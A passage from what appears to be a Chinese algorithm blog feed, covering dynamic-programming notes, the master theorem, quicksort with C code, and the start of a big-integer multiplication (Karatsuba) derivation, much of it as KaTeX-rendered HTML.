start="4"><li>尝试空间优化：<code>dp[i]</code>、<code>dp[i][j]</code>的求解往往是根据前一个、前（上）一行元素转移而来，转移过后的值后续有可能不再使用，此时就可以将一维优化为常数空间，二维优化为一维。</li></ol><h1 id="不同算法策略的选择">不同算法策略的选择</h1><p>一个问题是该用递推、贪心、搜索还是动态规划，完全是由这个问题本身阶段间状态的转移方式决定的！</p><ul><li>每个阶段只有一个状态-&gt;递推；</li><li>每个阶段的最优状态都是由上一个阶段的最优状态得到的-&gt;贪心；</li><li>每个阶段的最优状态是由之前所有阶段的状态的组合得到的-&gt;搜索；</li><li>每个阶段的最优状态可以从之前某个阶段的某个或某些状态直接得到而不管之前这个状态是如何得到的-&gt;动态规划。</li></ul><h1 id="主定理">主定理</h1><p>主理论（Master Theorem）是用来解决递归关系式的一种方法，特别是用于分析某些类型的递归算法的时间复杂度。</p><p>假设某个递归算法的时间复杂度递归公式为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi>a</mi><mo>×</mo><mi>T</mi><mo stretchy="false">(</mo><mfrac><mi>n</mi><mi>b</mi></mfrac><mo stretchy="false">)</mo><mo>+</mo><msup><mi>n</mi><mi>d</mi></msup><mo separator="true">,</mo><mtext>其中</mtext><mi>a</mi><mo>&gt;</mo><mn>1</mn><mo separator="true">,</mo><mi>b</mi><mo>&gt;</mo><mn>1</mn><mo separator="true">,</mo><mi>d</mi><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">T(n) = a \times T ( \frac{n}{b} ) + n^d, 其中a\gt1, b\gt1, d\gt0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.095em;vertical-align:-0.345em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">其</span><span class="mord cjk_fallback">中</span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span><br>这个表达式其实是在表达：将规模为n的问题转换为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span> 个规模为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>n</mi><mi>b</mi></mfrac></mrow><annotation encoding="application/x-tex">\frac{n}{b}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.040392em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span> 的子问题，在合并这些子问题的解时需要花费 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mi>d</mi></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^d)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 时间。</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240611140036.png" alt="image.png"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240611140120.png" alt="image.png"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240611140154.png" alt="image.png"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240611140211.png" alt="image.png"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240611140221.png" alt="image.png"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240611140249.png" alt="image.png"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240611140304.png" alt="image.png"></p><p>个人的一些动态规划文章：<br><a href="https://gngtwhh.github.io/2024-01-25-82f8daf7b803/">背包问题 | WAHAHA’s blog</a><br><a href="https://gngtwhh.github.io/2024-01-16-98d97cd29f25/">子序列问题 | WAHAHA’s blog</a></p><p>注：本文参考自课程ppt</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 动态规划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分治算法续</title>
      <link href="/20248e78923aa0be/"/>
      <url>/20248e78923aa0be/</url>
      
        <content type="html"><![CDATA[<h1 id="快速排序">快速排序</h1><h2 id="原理">原理</h2><ol><li>设当前要排序数组中元素的下标为 <code>p</code> 到 <code>r</code> ，我们选择 p 到 r 之间的任意一个数据作为 <code>pivot</code>（分区点）。我们遍历 p 到 r 之间的数据，<strong>将小于 pivot 的放到左边，将大于 pivot 的放到右边，将 pivot 放到中间</strong>。经过这一步骤之后，数组 p 到 r 之间的数据就被分成了三个部分，前面 p 到 q-1 之间都是小于 pivot 的，中间是 pivot，后面的 q+1 到 r 之间是大于 pivot 的。</li><li>然后，将数组以<code>pivot</code>分为左右2部分，依次递归地做与第1步相同的处理，直到分解到最小（子数组只有1或2个元素，此时可以简单地交换2个元素或直接返回即可完成该部分的排序）</li><li>初始的 <code>p</code> 和 <code>r</code> 为 <code>0</code> 和 <code>n-1</code>，n为数组总长度，待所有的分割的子数组完成操作后，整个数组就完成了排序。</li></ol><h2 id="和归并的比较">和归并的比较</h2><p>可以对比归并排序和快速排序：</p><ol><li>归并是从下到上，先处理子问题，再合并；而快速则是从上到下的，先完成分区处理，再递归地解决子问题。</li><li>合并无法在原地完成，必须使用额外空间，因此归并是非原地排序；而快排可以实现原地的分区。</li><li>二者复杂度都是 <code>O(nlogn)</code>。</li></ol><h2 id="代码">代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> a[<span class="number">1000</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">quick_sort</span><span class="params">( <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (left &gt;= right)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="type">int</span> key = a[left], i = left, j = right, temp;</span><br><span class="line"><span class="comment">//以最左边的元素为基准</span></span><br><span class="line"><span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line"><span class="keyword">while</span> (a[j] &gt;= key &amp;&amp; i &lt; j)</span><br><span class="line">--j;</span><br><span class="line"><span class="keyword">while</span> (a[i] &lt;= key &amp;&amp; i &lt; j)</span><br><span class="line">++i;</span><br><span class="line"><span class="keyword">if</span> (i != j) &#123; <span class="comment">//两边交换法</span></span><br><span class="line">temp = a[i];</span><br><span class="line">a[i] = a[j];</span><br><span class="line">a[j] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">a[left] = a[i];</span><br><span class="line">a[i] = key;</span><br><span class="line">quick_sort(left, i - <span class="number">1</span>);</span><br><span class="line">quick_sort( i + <span class="number">1</span>, right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">quick_sort( <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="大整数乘法">大整数乘法</h1><h2 id="原理">原理</h2><p>由于计算机的限制，一些大数据无法直接相乘，可以将大数乘法分解，分而治之，变成小数乘法后再将结果合并为大数的乘法结果。</p><p>问题：<br>设有 <code>x</code> 和 <code>y</code> 两个大数，计算其乘积。</p><p>数学前提：<br>设 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>l</mi><mi>e</mi><mi>n</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>l</mi><mi>e</mi><mi>n</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n=max(len(x),len(y))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span> 其中len(x)表示x的长度.<br>则可以做如下分解:<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>=</mo><msub><mi>x</mi><mn>1</mn></msub><mo>∗</mo><mn>1</mn><msup><mn>0</mn><mrow><mi>n</mi><mi mathvariant="normal">/</mi><mn>2</mn></mrow></msup><mo>+</mo><msub><mi>x</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">x=x_1 * 10^{n/2} + x_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9713299999999999em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mord mtight">/</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><msub><mi>y</mi><mn>1</mn></msub><mo>∗</mo><mn>1</mn><msup><mn>0</mn><mrow><mi>n</mi><mi mathvariant="normal">/</mi><mn>2</mn></mrow></msup><mo>+</mo><msub><mi>y</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">y=y_1 * 10^{n/2} + y_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9713299999999999em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mord mtight">/</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><br>其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">x_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">y_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是高位部分, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">x_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">y_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是低位部分.<br>则容易知道以下等式（S）：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>∗</mo><mi>y</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo>∗</mo><mn>1</mn><msup><mn>0</mn><mrow><mi>n</mi><mi mathvariant="normal">/</mi><mn>2</mn></mrow></msup><mo>+</mo><msub><mi>x</mi><mn>0</mn></msub><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><msub><mi>y</mi><mn>1</mn></msub><mo>∗</mo><mn>1</mn><msup><mn>0</mn><mrow><mi>n</mi><mi mathvariant="normal">/</mi><mn>2</mn></mrow></msup><mo>+</mo><msub><mi>y</mi><mn>0</mn></msub><mo stretchy="false">)</mo><mo>=</mo><msub><mi>x</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>y</mi><mn>1</mn></msub><mo>∗</mo><mn>1</mn><msup><mn>0</mn><mi>n</mi></msup><mo>+</mo><msub><mi>x</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>y</mi><mn>0</mn></msub><mo>∗</mo><mn>1</mn><msup><mn>0</mn><mrow><mi>n</mi><mi mathvariant="normal">/</mi><mn>2</mn></mrow></msup><mo>+</mo><msub><mi>x</mi><mn>0</mn></msub><mo>∗</mo><msub><mi>y</mi><mn>1</mn></msub><mo>∗</mo><mn>1</mn><msup><mn>0</mn><mrow><mi>n</mi><mi mathvariant="normal">/</mi><mn>2</mn></mrow></msup><mo>+</mo><msub><mi>x</mi><mn>0</mn></msub><mo>∗</mo><msub><mi>y</mi><mn>0</mn></msub><mo>=</mo><msub><mi>x</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>y</mi><mn>1</mn></msub><mo>∗</mo><mn>1</mn><msup><mn>0</mn><mi>n</mi></msup><mo>+</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo>+</mo><msub><mi>x</mi><mn>0</mn></msub><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><msub><mi>y</mi><mn>1</mn></msub><mo>+</mo><msub><mi>y</mi><mn>0</mn></msub><mo stretchy="false">)</mo><mo>−</mo><msub><mi>x</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>y</mi><mn>1</mn></msub><mo>−</mo><msub><mi>x</mi><mn>0</mn></msub><mo>∗</mo><msub><mi>y</mi><mn>0</mn></msub><mo stretchy="false">)</mo><mo>∗</mo><mn>1</mn><msup><mn>0</mn><mrow><mi>n</mi><mi mathvariant="normal">/</mi><mn>2</mn></mrow></msup><mo>+</mo><msub><mi>x</mi><mn>0</mn></msub><mo>∗</mo><msub><mi>y</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">x*y = (x_1 * 10^{n/2} + x_0)*(y_1 * 10^{n/2} + y_0) = x_1*y_1*10^n+x_1*y_0*10^{n/2}+x_0*y_1*10^{n/2}+x_0*y_0 = x_1*y_1*10^n+((x_1+x_0)*(y_1+y_0)-x_1*y_1-x_0*y_0)*10^{n/2}+x_0*y_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0213299999999998em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mord mtight">/</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" 